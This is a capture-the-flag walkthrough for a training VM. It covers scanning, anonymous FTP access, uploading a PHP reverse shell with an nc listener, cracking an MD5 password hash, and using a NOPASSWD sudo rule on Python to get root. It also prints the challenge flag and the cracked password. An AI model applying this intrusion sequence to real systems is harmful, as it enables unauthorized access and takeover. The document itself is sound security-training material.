
# Privilege Escalation Exercise: Detailed Walkthrough

## Summary

This README outlines the steps taken to complete a privilege escalation exercise on a virtual machine (VM). The VM setup had some initial misconfigurations that needed to be addressed to proceed. The goal was to gain root access and retrieve the flag from the root.txt file.

You can dowload the vm [here](https://assets.01-edu.org/cybersecurity/local/01-Local.ova).

####  Warning: If you see ip, all ip used here are for example purpose place your ip in [attacker_ip] and [target_ip].

## Initial Setup and Discovery

1. ### Identify VM MAC Address:
```sh
VBoxManage showvminfo "01-Local1" | grep MAC:
```
Result:

```sh
MAC: 0800277C1675
```

2. ### Scan Local Network for IP Address:
```sh
sudo arp-scan -l | grep 08:00:27:7c:16:75
```
Result:

```sh
[target_ip]  08:00:27:7c:16:75  PCS Systemtechnik GmbH
```

3. ### Check for Open Ports:

First, check if ports are filtered by using the `-sA` scan option:
```sh
nmap -sA [target_ip]
```

This scan shows whether ports are filtered or unfiltered by the firewall. If the ports are not filtered, it indicates no firewall is handling port traffic.

For a more discreet scan, you could use the `-sI` scan option, which uses a zombie host to make the scan harder to trace. However, for this exercise, we will use the `-sS` (TCP SYN) scan:

```sh
sudo nmap -sS [target_ip]
```

The TCP SYN scan, also known as a "half-open" scan, is stealthier as it does not complete the TCP handshake.

Result:

```sh
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

4. ### Check for port Access:

I used to check all the access type and found out this one:
```sh
nmap -p 21 --script=ftp-anon [target_ip]
```
Result:

```sh
Anonymous FTP login allowed (FTP code 230)
```

## FTP Connection and Reverse Shell

1. #### Connect to FTP as Anonymous:
```sh
ftp [target_ip]
```

Use the anonymous username and no password.

2. #### Upload Reverse Shell Script:

- Click [here](https://zone01normandie.org/git/yyoannle/local/src/branch/master/reverse.php) to look the reverse shell script.

- Upload script using FTP:
```sh
put reverse.sh
```

3. #### Set Up Listener on Attacker Machine:
```sh
nc -lvnp 1234
```

4. #### Trigger the Reverse Shell:

On the attacker machine navigate to:
```url
http://172.16.1.255/files/reverse.php
```

When the connection is set up properly you shoud get something like this:
```sh
└─$ nc -lvnp 1234                           
listening on [any] 1234 ...
connect to [attacker_ip] from (UNKNOWN)[target_ip] 60774
Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:10:29 up 21 min,  0 users,  load average: 0.09, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Privilege Escalation

1. ### Check Current Directory and Files:
```sh
ls -a
```

2. ### Explore Home Directory for Users:
We see a `shrek` user lets keep that in mind.
```sh
cd /home
ls -a
```

We found an `important.txt` file. 

3. ### Read important.txt:
```sh
cat /home/important.txt
```

Result:

```sh
run the script to see the data
/.runme.sh
```

4. ### Find and Read runme.sh:
```sh
find / -name ".runme.sh" 2>/dev/null
cat /.runme.sh
```
Result:
```sh
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:061fe5e7b95d5f98208d7bc89ed2d569
```
The output contains an encrypted string next to shrek. Let's decrypt it.

5. ### Decrypt the Password Hash:
First, check the hash pattern using a hash analyzer tool, which identifies it as MD5 or MD4 hash type. Use an MD5 decryption tool to decrypt the hash:
Result:
```txt
youaresmart
```

6. ### Switch to shrek User:

First we upgrade our remote to a full tty. And after switch on `shrek`:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
su shrek
```

Enter the password: `youaresmart.`

7. ### Check Sudo Privileges:
```sh 
sudo -l
```
Result:
```sh
(root) NOPASSWD: /usr/bin/python3.5
```

8. ### Use Python to Spawn Root Shell:

- Run Python as root:
```sh
sudo /usr/bin/python3.5
```
- In the Python shell:
```sh
import os
os.system("/bin/bash")
```

## Retrieve the Flag

1. ### Navigate to Root Directory:
```sh
cd /root
ls -a
```
2. Read `root.txt`:
```sh
cat /root/root.txt
```

Result:
```sh
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
                                                                                                                                                     
Congratulations, You have successfully completed the challenge!
Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

## Conclusion
By following the steps outlined above, the root flag was successfully retrieved from the VM. This exercise demonstrated the process of network discovery, exploiting FTP for initial access, and privilege escalation using available sudo privileges.


Made by **Yoann Letacq**

Thanks **Quentin Boiteux** for the usefull tips


